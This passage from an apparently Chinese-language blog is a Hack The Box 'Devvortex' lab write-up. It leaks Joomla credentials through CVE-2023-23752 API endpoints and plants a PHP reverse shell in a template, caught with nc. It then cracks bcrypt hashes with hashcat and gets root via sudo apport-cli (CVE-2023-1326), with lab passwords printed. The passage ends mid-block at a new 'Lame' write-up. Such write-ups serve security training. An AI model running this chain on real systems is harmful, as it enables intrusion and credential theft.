src="/2024/07/12/Hackthebox-Perfection-Writeup/mage-2.png"></p><p> google一下找到hacktricks的<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla">一篇文章</a>,上面寫說joomla 4.0.0到4.2.7有資訊及密碼洩漏的漏洞 (CVE-2023-23752) </p><p>Users: http:&#x2F;&#x2F;<host>&#x2F;api&#x2F;v1&#x2F;users?public&#x3D;true</p><p>Config File: http:&#x2F;&#x2F;<host>&#x2F;api&#x2F;index.php&#x2F;v1&#x2F;config&#x2F;application?public&#x3D;true</p><p>先進入<a href="http://dev.devvortex.htb/api/v1/users?public=true">http://dev.devvortex.htb/api/v1/users?public=true</a><br>發現有兩個username: lewis 和 logan,其中lewis再Super Users群組裡面</p><p> <img src="/2024/07/12/Hackthebox-Perfection-Writeup/mage-3.png"></p><p> 再到<a href="http://dev.devvortex.htb/api/index.php/v1/config/application?public=true">http://dev.devvortex.htb/api/index.php/v1/config/application?public=true</a> ,取得密碼</p><p> <img src="/2024/07/12/Hackthebox-Perfection-Writeup/mage-4.png"></p><p> 登入後為管理員面板<br> <img src="/2024/07/12/Hackthebox-Perfection-Writeup/mage-5.png"></p><p> 點擊左下角的System裡面的site template,修改error.php的內容為pentestmonkey的<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse shell</a></p><p> <img src="/2024/07/12/Hackthebox-Perfection-Writeup/mage-6.png"></p><p> 保存後回終端監聽,同時輸入網址<a href="http://dev.devvortex.htb//templates/cassiopeia/error.php">http://dev.devvortex.htb//templates/cassiopeia/error.php</a> 觸發reverse shell<br> <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"> ┌──(x㉿kali)-[~/devvortex]<br>└─$ nc -lvnp 4444                         <br>listening on [any] 4444 <span class="hljs-built_in">..</span>.<br>connect <span class="hljs-keyword">to</span> [10.10.14.53] <span class="hljs-keyword">from</span> (UNKNOWN) [10.10.11.242] 56994<br>Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux<br> 18:12:41 up  1:04,  0 users,  load average: 0.00, 0.00, 0.24<span class="hljs-built_in"></span><br><span class="hljs-built_in">USER </span>    TTY      <span class="hljs-keyword">FROM</span>             LOGIN@   IDLE   JCPU   PCPU WHAT<br><span class="hljs-attribute">uid</span>=33(www-data) <span class="hljs-attribute">gid</span>=33(www-data) <span class="hljs-attribute">groups</span>=33(www-data)<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$</span><br></code></pre></td></tr></table></figure></p><h2 id="提權"><a href="#提權" class="headerlink" title="提權"></a>提權</h2><hr><h3 id="使用-python獲得完整tty"><a href="#使用-python獲得完整tty" class="headerlink" title="使用 python獲得完整tty"></a>使用 python獲得完整tty</h3><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>按<code>CTRL+Z</code>,再輸入<code>stty raw -echo;fg</code></p><h3 id="查看監聽端口"><a href="#查看監聽端口" class="headerlink" title="查看監聽端口"></a>查看監聽端口</h3><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@devvortex:/$ ss -tlp<br>State     Recv-Q    Send-Q       Local Address:Port         Peer Address:Port   Process                                                                         <br>LISTEN    0         70               127.0.0.1:33060             0.0.0.0:*                                                                                      <br>LISTEN    0         151              127.0.0.1:mysql             0.0.0.0:*                                                                                      <br>LISTEN    0         511                0.0.0.0:http              0.0.0.0:*       <span class="hljs-built_in">users</span>:((&quot;nginx&quot;,pid=<span class="hljs-number">875</span>,fd=<span class="hljs-number">8</span>),(&quot;nginx&quot;,pid=<span class="hljs-number">874</span>,fd=<span class="hljs-number">8</span>))                          <br>LISTEN    0         4096         127.0.0.53%lo:domain            0.0.0.0:*                                                                                      <br>LISTEN    0         128                0.0.0.0:ssh               0.0.0.0:*                                                                                      <br>LISTEN    0         511                   [::]:http                 [::]:*       <span class="hljs-built_in">users</span>:((&quot;nginx&quot;,pid=<span class="hljs-number">875</span>,fd=<span class="hljs-number">9</span>),(&quot;nginx&quot;,pid=<span class="hljs-number">874</span>,fd=<span class="hljs-number">9</span>))                          <br>LISTEN    0         128                   [::]:ssh                  [::]:*<br></code></pre></td></tr></table></figure><p>發現有mysql服務,用一樣的密碼成功登入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@devvortex:/$ mysql -u lewis -p<br>Enter password: P4ntherg0t1n5r3c0n##<br><br>mysql&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| joomla             |<br>| performance_schema |<br>+--------------------+<br>3 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; use joomla;<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>mysql&gt; show tables;<br>+-------------------------------+<br>| Tables_in_joomla              |<br>+-------------------------------+<br>| sd4fg_action_log_config       |<br>| sd4fg_action_logs             |<br>| sd4fg_action_logs_extensions  |<br>| sd4fg_action_logs_users       |<br>| sd4fg_assets                  |<br>| sd4fg_associations            |<br>| sd4fg_banner_clients          |<br>| sd4fg_banner_tracks           |<br>| sd4fg_banners                 |<br>| sd4fg_categories              |<br>| sd4fg_contact_details         |<br>| sd4fg_content                 |<br>| sd4fg_content_frontpage       |<br>| sd4fg_content_rating          |<br>| sd4fg_content_types           |<br>| sd4fg_contentitem_tag_map     |<br>| sd4fg_extensions              |<br>| sd4fg_fields                  |<br>| sd4fg_fields_categories       |<br>| sd4fg_fields_groups           |<br>| sd4fg_fields_values           |<br>| sd4fg_finder_filters          |<br>| sd4fg_finder_links            |<br>| sd4fg_finder_links_terms      |<br>| sd4fg_finder_logging          |<br>| sd4fg_finder_taxonomy         |<br>| sd4fg_finder_taxonomy_map     |<br>| sd4fg_finder_terms            |<br>| sd4fg_finder_terms_common     |<br>| sd4fg_finder_tokens           |<br>| sd4fg_finder_tokens_aggregate |<br>| sd4fg_finder_types            |<br>| sd4fg_history                 |<br>| sd4fg_languages               |<br>| sd4fg_mail_templates          |<br>| sd4fg_menu                    |<br>| sd4fg_menu_types              |<br>| sd4fg_messages                |<br>| sd4fg_messages_cfg            |<br>| sd4fg_modules                 |<br>| sd4fg_modules_menu            |<br>| sd4fg_newsfeeds               |<br>| sd4fg_overrider               |<br>| sd4fg_postinstall_messages    |<br>| sd4fg_privacy_consents        |<br>| sd4fg_privacy_requests        |<br>| sd4fg_redirect_links          |<br>| sd4fg_scheduler_tasks         |<br>| sd4fg_schemas                 |<br>| sd4fg_session                 |<br>| sd4fg_tags                    |<br>| sd4fg_template_overrides      |<br>| sd4fg_template_styles         |<br>| sd4fg_ucm_base                |<br>| sd4fg_ucm_content             |<br>| sd4fg_update_sites            |<br>| sd4fg_update_sites_extensions |<br>| sd4fg_updates                 |<br>| sd4fg_user_keys               |<br>| sd4fg_user_mfa                |<br>| sd4fg_user_notes              |<br>| sd4fg_user_profiles           |<br>| sd4fg_user_usergroup_map      |<br>| sd4fg_usergroups              |<br>| sd4fg_users                   |<br>| sd4fg_viewlevels              |<br>| sd4fg_webauthn_credentials    |<br>| sd4fg_workflow_associations   |<br>| sd4fg_workflow_stages         |<br>| sd4fg_workflow_transitions    |<br>| sd4fg_workflows               |<br>+-------------------------------+<br>71 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.01 sec)<br><br>mysql&gt; <span class="hljs-keyword">select</span> * from sd4fg_users;<br>+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+                                                         <br>| <span class="hljs-built_in">id</span>  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |                                                                              <br>+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+                                                                              <br>| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10<span class="hljs-variable">$6V52x</span>.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2024-07-15 18:29:27 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |<br>| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10<span class="hljs-variable">$IT4k5kmSGvHSO9d6M</span>/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | &#123;<span class="hljs-string">&quot;admin_style&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;admin_language&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;language&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;editor&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;timezone&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;a11y_mono&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;a11y_contrast&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;a11y_highlight&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;a11y_font&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>&#125; | NULL          |          0 |        |      |            0 |              |<br>+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+<br>2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><p>取得logan的密碼hash<code>$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12</code></p><p>到<a href="https://hashes.com/en/tools/hash_identifier">https://hashes.com/en/tools/hash_identifier</a> 辨識hash類型為bcrypt $2*$, Blowfish (Unix)<br><img src="/2024/07/12/Hackthebox-Perfection-Writeup/mage-7.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ hashcat -h|grep bcrypt                      <br>   3200 | bcrypt <span class="hljs-variable">$2</span>*$, Blowfish (Unix)                               | Operating System<br>  25600 | bcrypt(md5(<span class="hljs-variable">$pass</span>)) / bcryptmd5                             | Forums, CMS, E-Commerce<br>  25800 | bcrypt(sha1(<span class="hljs-variable">$pass</span>)) / bcryptsha1                           | Forums, CMS, E-Commerce<br>  28400 | bcrypt(sha512(<span class="hljs-variable">$pass</span>)) / bcryptsha512                       | Forums, CMS, E-Commerce<br>                                                                                   <br>┌──(x㉿kali)-[~]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12&#x27;</span>&gt;hash.txt<br>                                                                                   <br>┌──(x㉿kali)-[~]<br>└─$ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt<br>hashcat (v6.2.6) starting<br><br>OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>==================================================================================================================================================<br>* Device <span class="hljs-comment">#1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i5-11320H @ 3.20GHz, 6832/13729 MB (2048 MB allocatable), 8MCU</span><br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 72<br><br>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 1<br><br>Optimizers applied:<br>* Zero-Byte<br>* Single-Hash<br>* Single-Salt<br><br>Watchdog: Temperature abort trigger <span class="hljs-built_in">set</span> to 90c<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: 0 MB<br><br>Dictionary cache built:<br>* Filename..: /usr/share/wordlists/rockyou.txt<br>* Passwords.: 14344392<br>* Bytes.....: 139921507<br>* Keyspace..: 14344385<br>* Runtime...: 1 sec<br><br>Cracking performance lower than expected?                 <br><br>* Append -w 3 to the commandline.<br>  This can cause your screen to lag.<br><br>* Append -S to the commandline.<br>  This has a drastic speed impact but can be better <span class="hljs-keyword">for</span> specific attacks.<br>  Typical scenarios are a small wordlist but a large ruleset.<br><br>* Update your backend API runtime / driver the right way:<br>  https://hashcat.net/faq/wrongdriver<br><br>* Create more work items to make use of your parallelization power:<br>  https://hashcat.net/faq/morework<br><br>$2y$10<span class="hljs-variable">$IT4k5kmSGvHSO9d6M</span>/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho<br>                                                          <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Mode........: 3200 (bcrypt <span class="hljs-variable">$2</span>*$, Blowfish (Unix))<br>Hash.Target......: $2y$10<span class="hljs-variable">$IT4k5kmSGvHSO9d6M</span>/1w0eYiB5Ne9XzArQRFJTGThNiy...tkIj12<br>Time.Started.....: Tue Jul 16 03:02:43 2024 (16 secs)<br>Time.Estimated...: Tue Jul 16 03:02:59 2024 (0 secs)<br>Kernel.Feature...: Pure Kernel<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.#1.........:       84 H/s (12.16ms) @ Accel:8 Loops:16 Thr:1 Vec:1<br>Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)<br>Progress.........: 1408/14344385 (0.01%)<br>Rejected.........: 0/1408 (0.00%)<br>Restore.Point....: 1344/14344385 (0.01%)<br>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024<br>Candidate.Engine.: Device Generator<br>Candidates.#1....: teacher -&gt; tagged<br>Hardware.Mon.#1..: Temp: 54c Util: 90%<br></code></pre></td></tr></table></figure><p>成功破解logan的密碼：<code>tequieromucho</code></p><h3 id="ssh登入logan的帳號"><a href="#ssh登入logan的帳號" class="headerlink" title="ssh登入logan的帳號"></a>ssh登入logan的帳號</h3><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh logan@10.10.11.242<br>logan@10.10.11.242<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System information as of Mon 15 Jul 2024 06:56:48 PM UTC</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System load:  0.0               Processes:             171</span><br><span class="hljs-string">  Usage of /:   69.0% of 4.76GB   Users logged in:       0</span><br><span class="hljs-string">  Memory usage: 20%               IPv4 address for eth0: 10.10.11.242</span><br><span class="hljs-string">  Swap usage:   0%</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Expanded Security Maintenance for Applications is not enabled.</span><br><span class="hljs-string"></span><br><span class="hljs-string">0 updates can be applied immediately.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Enable ESM Apps to receive additional future security updates.</span><br><span class="hljs-string">See https://ubuntu.com/esm or run: sudo pro status</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">The list of available updates is more than a week old.</span><br><span class="hljs-string">To check for new updates run: sudo apt update</span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Mon Feb 26 14:44:38 2024 from 10.10.14.23</span><br><span class="hljs-string">logan@devvortex:~$ id</span><br><span class="hljs-string">uid=1000(logan) gid=1000(logan) groups=1000(logan)</span><br><span class="hljs-string">logan@devvortex:~$ ls</span><br><span class="hljs-string">user.txt</span><br><span class="hljs-string">logan@devvortex:~$ cat user.txt</span><br><span class="hljs-string">&lt;user flag&gt;</span><br></code></pre></td></tr></table></figure><h3 id="取得root權限"><a href="#取得root權限" class="headerlink" title="取得root權限"></a>取得root權限</h3><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">logan@devvortex:~$ <span class="hljs-built_in">sudo</span> -l<br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> logan: <br><br>Sorry, try again.<br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> logan: <br>Sorry, try again.<br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> logan: <br>Matching Defaults entries <span class="hljs-keyword">for</span> logan on devvortex:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User logan may run the following commands on devvortex:<br>    (ALL : ALL) /usr/bin/apport-cli<br></code></pre></td></tr></table></figure><p>看起來apport-cli可以用sudo執行,google找到這篇文章<a href="https://vk9-sec.com/cve-2023-1326privilege-escalation-apport-cli-2-26-0/">https://vk9-sec.com/cve-2023-1326privilege-escalation-apport-cli-2-26-0/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs bash">logan@devvortex:~$ <span class="hljs-built_in">sudo</span> /usr/bin/apport-cli -f<br><br>*** What kind of problem <span class="hljs-keyword">do</span> you want to report?<br><br><br>Choices:<br>  1: Display (X.org)<br>  2: External or internal storage devices (e. g. USB sticks)<br>  3: Security related problems<br>  4: Sound/audio related problems<br>  5: dist-upgrade<br>  6: installation<br>  7: installer<br>  8: release-upgrade<br>  9: ubuntu-release-upgrader<br>  10: Other problem<br>  C: Cancel<br>Please choose (1/2/3/4/5/6/7/8/9/10/C): 1<br><br><br>*** Collecting problem information<br><br>The collected information can be sent to the developers to improve the<br>application. This might take a few minutes.<br><br>*** What display problem <span class="hljs-keyword">do</span> you observe?<br><br><br>Choices:<br>  1: I don<span class="hljs-string">&#x27;t know</span><br><span class="hljs-string">  2: Freezes or hangs during boot or usage</span><br><span class="hljs-string">  3: Crashes or restarts back to login screen</span><br><span class="hljs-string">  4: Resolution is incorrect</span><br><span class="hljs-string">  5: Shows screen corruption</span><br><span class="hljs-string">  6: Performance is worse than expected</span><br><span class="hljs-string">  7: Fonts are the wrong size</span><br><span class="hljs-string">  8: Other display-related problem</span><br><span class="hljs-string">  C: Cancel</span><br><span class="hljs-string">Please choose (1/2/3/4/5/6/7/8/C): 2</span><br><span class="hljs-string"></span><br><span class="hljs-string">*** </span><br><span class="hljs-string"></span><br><span class="hljs-string">To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze</span><br><span class="hljs-string"></span><br><span class="hljs-string">Press any key to continue... </span><br><span class="hljs-string"></span><br><span class="hljs-string">.dpkg-query: no packages found matching xorg</span><br><span class="hljs-string">....</span><br><span class="hljs-string">........</span><br><span class="hljs-string"></span><br><span class="hljs-string">*** Send problem report to the developers?</span><br><span class="hljs-string"></span><br><span class="hljs-string">After the problem report has been sent, please fill out the form in the</span><br><span class="hljs-string">automatically opened web browser.</span><br><span class="hljs-string"></span><br><span class="hljs-string">What would you like to do? Your options are:</span><br><span class="hljs-string">  S: Send report (1.4 KB)</span><br><span class="hljs-string">  V: View report</span><br><span class="hljs-string">  K: Keep report file for sending later or copying to somewhere else</span><br><span class="hljs-string">  I: Cancel and ignore future crashes of this program version</span><br><span class="hljs-string">  C: Cancel</span><br><span class="hljs-string">Please choose (S/V/K/I/C): </span><br><span class="hljs-string">What would you like to do? Your options are:</span><br><span class="hljs-string">  S: Send report (1.4 KB)</span><br><span class="hljs-string">  V: View report</span><br><span class="hljs-string">  K: Keep report file for sending later or copying to somewhere else</span><br><span class="hljs-string">  I: Cancel and ignore future crashes of this program version</span><br><span class="hljs-string">  C: Cancel</span><br><span class="hljs-string">Please choose (S/V/K/I/C): v</span><br><span class="hljs-string">root@devvortex:/home/logan# id</span><br><span class="hljs-string">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="hljs-string">root@devvortex:/home/logan# cat /root/root.txt</span><br><span class="hljs-string">&lt;root flag&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hackthebox Machines</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hackthebox-Lame-Writeup</title>
    <link href="/2024/07/15/Hackthebox-Lame-Writeup/"/>
    <url>/2024/07/15/Hackthebox-Lame-Writeup/</url>
    
    <content type="html"><![CDATA[<p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/ng"></p><h2 id="信息蒐集"><a href="#信息蒐集" class="headerlink" title="信息蒐集"></a>信息蒐集</h2><hr><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 